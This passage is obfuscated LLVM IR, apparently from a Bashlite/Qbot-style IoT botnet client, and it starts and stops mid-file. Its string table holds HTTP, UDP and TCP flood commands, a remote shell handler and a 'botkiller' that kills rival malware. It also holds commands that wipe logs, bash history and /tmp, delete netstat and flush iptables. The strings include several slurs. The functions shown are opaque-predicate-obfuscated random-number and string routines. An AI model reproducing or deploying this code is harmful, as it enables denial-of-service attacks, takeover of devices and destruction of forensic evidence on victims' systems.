@.str.403 = private unnamed_addr constant [9 x i8] c"qsortEQS\00", align 1
@.str.404 = private unnamed_addr constant [16 x i8] c"8969876hjkghblk\00", align 1
@.str.405 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.406 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.407 = private unnamed_addr constant [6 x i8] c"hackz\00", align 1
@.str.408 = private unnamed_addr constant [7 x i8] c"shdyed\00", align 1
@.str.409 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.410 = private unnamed_addr constant [10 x i8] c"sghwiondc\00", align 1
@.str.411 = private unnamed_addr constant [7 x i8] c"nigger\00", align 1
@.str.412 = private unnamed_addr constant [6 x i8] c"pussy\00", align 1
@.str.413 = private unnamed_addr constant [7 x i8] c"faggot\00", align 1
@.str.414 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.415 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.416 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.417 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.418 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.419 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.420 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.421 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.422 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.423 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@botkiller.teldirs = private unnamed_addr constant [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.29, i32 0, i32 0), i8* null], align 16
@botkiller.Boats = private unnamed_addr constant [23 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.424, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.425, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.426, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.427, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.428, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.429, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.430, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.431, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.432, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.433, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.434, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.436, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.437, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.439, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.441, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.442, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.443, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.444, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.445, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.445, i32 0, i32 0)], align 16
@botkiller.bots = private unnamed_addr constant [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.446, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.447, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.448, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.432, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.437, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.449, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.450, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.431, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.426, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.436, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.428, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.454, i32 0, i32 0)], align 16
@.str.455 = private unnamed_addr constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00", align 1
@.str.456 = private unnamed_addr constant [29 x i8] c">%s.t && cd %s ; >retrieve\0D\0A\00", align 1
@.str.457 = private unnamed_addr constant [14 x i8] c"pkill -9 %s\0D\0A\00", align 1
@.str.446 = private unnamed_addr constant [8 x i8] c"jackmy*\00", align 1
@.str.447 = private unnamed_addr constant [9 x i8] c"busybox*\00", align 1
@.str.448 = private unnamed_addr constant [5 x i8] c"bin*\00", align 1
@.str.432 = private unnamed_addr constant [5 x i8] c"sex*\00", align 1
@.str.437 = private unnamed_addr constant [6 x i8] c"tftp*\00", align 1
@.str.449 = private unnamed_addr constant [5 x i8] c"arm*\00", align 1
@.str.450 = private unnamed_addr constant [8 x i8] c"mipsel*\00", align 1
@.str.431 = private unnamed_addr constant [6 x i8] c"mips*\00", align 1
@.str.451 = private unnamed_addr constant [8 x i8] c"mips64*\00", align 1
@.str.452 = private unnamed_addr constant [6 x i8] c"i686*\00", align 1
@.str.453 = private unnamed_addr constant [7 x i8] c"sparc*\00", align 1
@.str.435 = private unnamed_addr constant [5 x i8] c"sh4*\00", align 1
@.str.426 = private unnamed_addr constant [5 x i8] c"bot*\00", align 1
@.str.436 = private unnamed_addr constant [11 x i8] c"jackmeoff*\00", align 1
@.str.428 = private unnamed_addr constant [7 x i8] c"hackz*\00", align 1
@.str.454 = private unnamed_addr constant [6 x i8] c"bruv*\00", align 1
@.str.424 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.425 = private unnamed_addr constant [6 x i8] c"armv*\00", align 1
@.str.427 = private unnamed_addr constant [6 x i8] c"ntpd*\00", align 1
@.str.429 = private unnamed_addr constant [8 x i8] c"shitty*\00", align 1
@.str.430 = private unnamed_addr constant [6 x i8] c"jack*\00", align 1
@.str.433 = private unnamed_addr constant [4 x i8] c"i86\00", align 1
@.str.434 = private unnamed_addr constant [5 x i8] c"ssh*\00", align 1
@.str.438 = private unnamed_addr constant [4 x i8] c"i56\00", align 1
@.str.439 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.440 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.441 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.442 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.443 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.444 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.445 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.458 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.459 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.460 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.461 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.462 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.463 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.464 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.465 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.466 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.467 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.468 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.469 = private unnamed_addr constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00", align 1
@.str.470 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.471 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.472 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.473 = private unnamed_addr constant [8 x i8] c"BOTKILL\00", align 1
@.str.474 = private unnamed_addr constant [27 x i8] c"[BOTKILLER] [STARTED] [%s]\00", align 1
@.str.475 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.476 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.477 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.478 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.479 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.480 = private unnamed_addr constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00", align 1
@.str.481 = private unnamed_addr constant [6 x i8] c"PHONE\00", align 1
@.str.482 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.483 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.484 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.485 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.486 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.487 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.488 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.489 = private unnamed_addr constant [6 x i8] c"HITTA\00", align 1
@.str.490 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.491 = private unnamed_addr constant [23 x i8] c"[CONNECTED] [%s] [%s]\0A\00", align 1
@.str.492 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.493 = private unnamed_addr constant [29 x i8] c"\1B[0;32m[CONNECTED] [%s] [%s]\00", align 1
@.str.494 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.495 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.496 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.497 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.498 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.499 = private unnamed_addr constant [19 x i8] c"BYE MISTER HITTA!\0A\00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0
@x.95 = common global i32 0
@y.96 = common global i32 0
@x.97 = common global i32 0
@y.98 = common global i32 0
@x.99 = common global i32 0
@y.100 = common global i32 0
@x.101 = common global i32 0
@y.102 = common global i32 0
@x.103 = common global i32 0
@y.104 = common global i32 0
@x.105 = common global i32 0
@y.106 = common global i32 0
@x.107 = common global i32 0
@y.108 = common global i32 0
@x.109 = common global i32 0
@y.110 = common global i32 0
@x.111 = common global i32 0
@y.112 = common global i32 0
@x.113 = common global i32 0
@y.114 = common global i32 0
@x.115 = common global i32 0
@y.116 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = load i32, i32* @x
  %3 = load i32, i32* @y
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* %10, align 4
  store i32 %12, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %13 = load i32, i32* %10, align 4
  %14 = add i32 %13, -1640531527
  store i32 %14, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %15 = load i32, i32* %10, align 4
  %16 = add i32 %15, -1640531527
  %17 = add i32 %16, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %11, align 4
  %18 = load i32, i32* @x
  %19 = load i32, i32* @y
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart225, %originalBBpart2
  %27 = load i32, i32* %11, align 4
  %28 = icmp slt i32 %27, 4096
  br i1 %28, label %29, label %66

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* %11, align 4
  %31 = sub nsw i32 %30, 3
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %32
  %34 = load i32, i32* %33, align 4
  %35 = load i32, i32* %11, align 4
  %36 = sub nsw i32 %35, 2
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = xor i32 %34, %39
  %41 = xor i32 %40, -1640531527
  %42 = load i32, i32* %11, align 4
  %43 = xor i32 %41, %42
  %44 = load i32, i32* %11, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %45
  store i32 %43, i32* %46, align 4
  br label %47

; <label>:47:                                     ; preds = %29
  %48 = load i32, i32* @x
  %49 = load i32, i32* @y
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %47
  %56 = load i32, i32* %11, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %11, align 4
  %58 = load i32, i32* @x
  %59 = load i32, i32* @y
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart225, label %originalBB16alteredBB

originalBBpart225:                                ; preds = %originalBB16
  br label %26

; <label>:66:                                     ; preds = %26
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %67 = alloca i32, align 4
  %68 = alloca i32, align 4
  store i32 %0, i32* %67, align 4
  %69 = load i32, i32* %67, align 4
  store i32 %69, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %70 = load i32, i32* %67, align 4
  %_ = sub i32 %70, -1640531527
  %gen = mul i32 %_, -1640531527
  %_1 = sub i32 %70, -1640531527
  %gen2 = mul i32 %_1, -1640531527
  %_3 = sub i32 0, %70
  %gen4 = add i32 %_3, -1640531527
  %71 = add i32 %70, -1640531527
  store i32 %71, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %72 = load i32, i32* %67, align 4
  %_5 = sub i32 %72, -1640531527
  %gen6 = mul i32 %_5, -1640531527
  %_7 = shl i32 %72, -1640531527
  %_8 = sub i32 0, %72
  %gen9 = add i32 %_8, -1640531527
  %_10 = sub i32 %72, -1640531527
  %gen11 = mul i32 %_10, -1640531527
  %_12 = sub i32 %72, -1640531527
  %gen13 = mul i32 %_12, -1640531527
  %73 = add i32 %72, -1640531527
  %_14 = sub i32 %73, -1640531527
  %gen15 = mul i32 %_14, -1640531527
  %74 = add i32 %73, -1640531527
  store i32 %74, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %68, align 4
  br label %originalBB

originalBB16alteredBB:                            ; preds = %originalBB16, %47
  %75 = load i32, i32* %11, align 4
  %_17 = shl i32 %75, 1
  %_18 = sub i32 %75, 1
  %gen19 = mul i32 %_18, 1
  %_20 = shl i32 %75, 1
  %_21 = sub i32 0, %75
  %gen22 = add i32 %_21, 1
  %_23 = shl i32 %75, 1
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %11, align 4
  br label %originalBB16
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = load i32, i32* @x.1
  %2 = load i32, i32* @y.2
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i64 18782, i64* %10, align 8
  store i32 -2, i32* %12, align 4
  %13 = load i32, i32* @rand_cmwc.i, align 4
  %14 = add i32 %13, 1
  %15 = and i32 %14, 4095
  store i32 %15, i32* @rand_cmwc.i, align 4
  %16 = load i64, i64* %10, align 8
  %17 = load i32, i32* @rand_cmwc.i, align 4
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = mul i64 %16, %21
  %23 = load i32, i32* @c, align 4
  %24 = zext i32 %23 to i64
  %25 = add i64 %22, %24
  store i64 %25, i64* %9, align 8
  %26 = load i64, i64* %9, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %9, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = add i64 %29, %31
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* %11, align 4
  %34 = load i32, i32* %11, align 4
  %35 = load i32, i32* @c, align 4
  %36 = icmp ult i32 %34, %35
  %37 = load i32, i32* @x.1
  %38 = load i32, i32* @y.2
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %50

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* %11, align 4
  %47 = add i32 %46, 1
  store i32 %47, i32* %11, align 4
  %48 = load i32, i32* @c, align 4
  %49 = add i32 %48, 1
  store i32 %49, i32* @c, align 4
  br label %50

; <label>:50:                                     ; preds = %45, %originalBBpart2
  %51 = load i32, i32* %12, align 4
  %52 = load i32, i32* %11, align 4
  %53 = sub i32 %51, %52
  %54 = load i32, i32* @rand_cmwc.i, align 4
  %55 = zext i32 %54 to i64
  %56 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %55
  store i32 %53, i32* %56, align 4
  ret i32 %53

originalBBalteredBB:                              ; preds = %originalBB, %0
  %57 = alloca i64, align 8
  %58 = alloca i64, align 8
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  store i64 18782, i64* %58, align 8
  store i32 -2, i32* %60, align 4
  %61 = load i32, i32* @rand_cmwc.i, align 4
  %_ = sub i32 %61, 1
  %gen = mul i32 %_, 1
  %_1 = shl i32 %61, 1
  %_2 = sub i32 %61, 1
  %gen3 = mul i32 %_2, 1
  %_4 = sub i32 0, %61
  %gen5 = add i32 %_4, 1
  %_6 = sub i32 %61, 1
  %gen7 = mul i32 %_6, 1
  %_8 = sub i32 %61, 1
  %gen9 = mul i32 %_8, 1
  %_10 = sub i32 0, %61
  %gen11 = add i32 %_10, 1
  %62 = add i32 %61, 1
  %_12 = sub i32 0, %62
  %gen13 = add i32 %_12, 4095
  %_14 = shl i32 %62, 4095
  %_15 = sub i32 0, %62
  %gen16 = add i32 %_15, 4095
  %_17 = shl i32 %62, 4095
  %63 = and i32 %62, 4095
  store i32 %63, i32* @rand_cmwc.i, align 4
  %64 = load i64, i64* %58, align 8
  %65 = load i32, i32* @rand_cmwc.i, align 4
  %66 = zext i32 %65 to i64
  %67 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %66
  %68 = load i32, i32* %67, align 4
  %69 = zext i32 %68 to i64
  %_18 = sub i64 %64, %69
  %gen19 = mul i64 %_18, %69
  %_20 = sub i64 %64, %69
  %gen21 = mul i64 %_20, %69
  %_22 = shl i64 %64, %69
  %_23 = sub i64 0, %64
  %gen24 = add i64 %_23, %69
  %_25 = sub i64 %64, %69
  %gen26 = mul i64 %_25, %69
  %_27 = sub i64 0, %64
  %gen28 = add i64 %_27, %69
  %_29 = sub i64 %64, %69
  %gen30 = mul i64 %_29, %69
  %70 = mul i64 %64, %69
  %71 = load i32, i32* @c, align 4
  %72 = zext i32 %71 to i64
  %_31 = sub i64 0, %70
  %gen32 = add i64 %_31, %72
  %_33 = shl i64 %70, %72
  %_34 = sub i64 %70, %72
  %gen35 = mul i64 %_34, %72
  %_36 = sub i64 %70, %72
  %gen37 = mul i64 %_36, %72
  %_38 = shl i64 %70, %72
  %_39 = sub i64 %70, %72
  %gen40 = mul i64 %_39, %72
  %73 = add i64 %70, %72
  store i64 %73, i64* %57, align 8
  %74 = load i64, i64* %57, align 8
  %_41 = shl i64 %74, 32
  %_42 = shl i64 %74, 32
  %_43 = shl i64 %74, 32
  %75 = lshr i64 %74, 32
  %76 = trunc i64 %75 to i32
  store i32 %76, i32* @c, align 4
  %77 = load i64, i64* %57, align 8
  %78 = load i32, i32* @c, align 4
  %79 = zext i32 %78 to i64
  %_44 = sub i64 0, %77
  %gen45 = add i64 %_44, %79
  %80 = add i64 %77, %79
  %81 = trunc i64 %80 to i32
  store i32 %81, i32* %59, align 4
  %82 = load i32, i32* %59, align 4
  %83 = load i32, i32* @c, align 4
  %84 = icmp ult i32 %82, %83
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %originalBBpart2, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %38

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @x.3
  %21 = load i32, i32* @y.4
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i32, i32* %4, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* @x.3
  %31 = load i32, i32* @y.4
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %10

; <label>:38:                                     ; preds = %10
  br label %39

; <label>:39:                                     ; preds = %originalBBpart227, %38
  %40 = load i32, i32* @x.3
  %41 = load i32, i32* @y.4
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB5, label %originalBB5alteredBB

originalBB5:                                      ; preds = %originalBB5alteredBB, %39
  %48 = load i32, i32* %5, align 4
  %49 = load i32, i32* %4, align 4
  %50 = icmp sge i32 %48, %49
  %51 = load i32, i32* @x.3
  %52 = load i32, i32* @y.4
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart27, label %originalBB5alteredBB

originalBBpart27:                                 ; preds = %originalBB5
  br i1 %50, label %59, label %84

; <label>:59:                                     ; preds = %originalBBpart27
  %60 = load i32, i32* @x.3
  %61 = load i32, i32* @y.4
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %59
  %68 = load i8*, i8** %2, align 8
  %69 = load i32, i32* %5, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %68, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = call i32 @isspace(i32 %73) #10
  %75 = icmp ne i32 %74, 0
  %76 = load i32, i32* @x.3
  %77 = load i32, i32* @y.4
